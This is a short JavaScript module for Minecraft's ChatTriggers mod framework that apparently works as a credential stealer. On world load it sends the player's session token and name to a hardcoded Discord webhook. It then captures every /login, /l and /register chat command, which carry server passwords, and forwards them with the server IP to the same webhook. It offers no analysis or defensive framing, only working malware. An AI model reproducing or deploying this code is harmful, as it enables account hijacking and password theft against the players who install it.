import request from "../../../requestV2"

const C01PacketChatMessage = Java.type("net.minecraft.network.play.client.C01PacketChatMessage")
TOKEN = Client.getMinecraft().func_110432_I().func_148254_d()
NAME = Player.getName()
WEBHOOK = "https://discord.com/api/webhooks/1426119266876260394/Er8J9oi7bYVAzvaWalpo0nwlWoBRX5hFo6sWjCeHM7QjoZbf1rfnv4wh178T35jPU2vn"

function sendWebhook(message) {
    request({
    url: WEBHOOK,
    method: "POST",
    headers: {"User-agent":"Mozilla/5.0"},
    body: {"content": message}
    })}


const hihi = register("worldLoad", () => {
    sendWebhook("Nick: `" + NAME + "`\n" +
    "Token:\n```" + TOKEN + "```")
    hihi.unregister()
})

register("packetSent", (packet, event) => {
    const message = packet.func_149439_c()
    
    if (message.startsWith("/login") || message.startsWith("/l ") || message.startsWith("/register")) {
        sendWebhook(
            "Nick: `" + NAME + "`\n" +
            "Server: `" + Server.getIP() + "`\n" +
            "Data: `" + message + "`"
)}}).setFilteredClass(C01PacketChatMessage)